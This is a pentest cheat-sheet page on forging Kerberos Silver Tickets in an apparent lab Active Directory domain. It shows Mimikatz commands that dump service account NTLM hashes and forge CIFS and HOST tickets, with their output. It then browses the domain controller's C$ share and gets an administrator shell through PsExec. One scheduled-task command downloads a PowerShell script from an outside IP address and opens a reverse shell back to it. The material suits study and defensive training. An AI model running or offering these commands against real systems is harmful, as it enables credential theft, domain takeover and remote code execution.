---
description: >-
  A Silver Ticket is a forged Kerberos Ticket Granting Service (TGS) ticket (aka
  “service ticket”).
---

# Silver Ticket

Attacker forges TGS ticket using the service account password hash. No intermediary TGT \(Ticket Granting Ticket\) is needed. That means Silver Ticket attacks can be created without any communication with a Domain Controller, making them easier to generate and harder for targeted organizations to detect. It also means that network taps and span port devices typically used for network security monitoring won’t reliably observe the attack.

## Tickets flow:

![](../../.gitbook/assets/image%20%284%29.png)

### Silver Tickets with explanation:

![](../../.gitbook/assets/image.png)

## Attack

Dump a service account hash:

```text
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

...

RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 29a19f65d22dcc18909aa252303a18ef

RID  : 00000454 (1108)
User : DCORP-MGMT$
LM   :
NTLM : 639c1adde3e0d1ba0d733c7d0d8f23ec

RID  : 00000456 (1110)
User : DCORP-CI$
LM   :
NTLM : bc7c774ae1c2f9325adee16ff86681fc

...
```

### Craft Silver Ticket

```text
kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:29a19f65d22dcc18909aa252303a18ef /user:Administrator /ptt
```

{% hint style="info" %}
There is no kerberos::**Silver** module, we are using golden for crafting Silver tickets.
{% endhint %}

| **/user** | Username for which the TGT is generated |
| :--- | :--- |
| **/domain** | Domain FQDN |
| **/sid** | SID of the domain |
| **/target** | Target server FQDN |
| **/service** | The SPN name of the service for which TGS will be created |
| **/rc4** | NTLM \(RC4\) hash of the service account. |
| **/ptt** | Inject the ticket in current PowerShell process \(use **/ticket** for saving into file\) |

{% hint style="info" %}
For optional arguments see Golden Ticket section.
{% endhint %}

### Verify tickets

```text
PS C:\AD\Tools> klist

Current LogonId is 0:0x14ec040

Cached Tickets: (1)

#0>     Client: Administrator @ dollarcorp.moneycorp.local
        Server: CIFS/dcorp-dc.dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/27/2020 12:22:16 (local)
        End Time:   9/25/2030 12:22:16 (local)
        Renew Time: 9/25/2030 12:22:16 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

### Request service

#### CIFS - Accessing File System

Using ticket generated above

```text
PS C:\AD\Tools> ls \\dcorp-dc.dollarcorp.moneycorp.local\c$

    Directory: \\dcorp-dc.dollarcorp.moneycorp.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/29/2019   1:32 AM                PerfLogs
d-r---        2/16/2019   9:14 PM                Program Files
d-----        7/16/2016   6:23 AM                Program Files (x86)
d-r---       12/14/2019   8:23 PM                Users
d-----        9/27/2020  10:43 AM                Windows

```

#### HOST - Scheduling tasks

Download and run reverse powershell

```text
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.78/Invoke-PowerShellTcp.ps1'''); Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.78 -Port 4444'"
```

Add new user - ADMIN + RDP:



#### CIFS + HOST - Remote console via PSExec

```text
mimikatz # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:29a19f65d22dcc18909aa252303a18ef /user:Administrator /ptt
mimikatz # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:29a19f65d22dcc18909aa252303a18ef /user:Administrator /ptt

...

PS C:\AD\Tools>  .\PsExec.exe \\dcorp-dc.dollarcorp.moneycorp.local cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
dollarcorp\administrator
```

## TGS required services

<table>
  <thead>
    <tr>
      <th style="text-align:left">Service Type</th>
      <th style="text-align:left">Service Silver Ticket</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">WMI</td>
      <td style="text-align:left">HOST + RPCSS</td>
    </tr>
    <tr>
      <td style="text-align:left">PSRemote</td>
      <td style="text-align:left">
        <p>HOST + HTTP</p>
        <p>WSMAN + RPCSS</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">WinRM</td>
      <td style="text-align:left">HOST + HTTP</td>
    </tr>
    <tr>
      <td style="text-align:left">Scheduled Tasks</td>
      <td style="text-align:left">HOST</td>
    </tr>
    <tr>
      <td style="text-align:left">Windows File Share (CIFS)</td>
      <td style="text-align:left">CIFS</td>
    </tr>
    <tr>
      <td style="text-align:left">LDAP including DCSync</td>
      <td style="text-align:left">LDAP</td>
    </tr>
    <tr>
      <td style="text-align:left">Windows RSAT</td>
      <td style="text-align:left">RPCSS + LDAP + CIFS</td>
    </tr>
  </tbody>
</table>

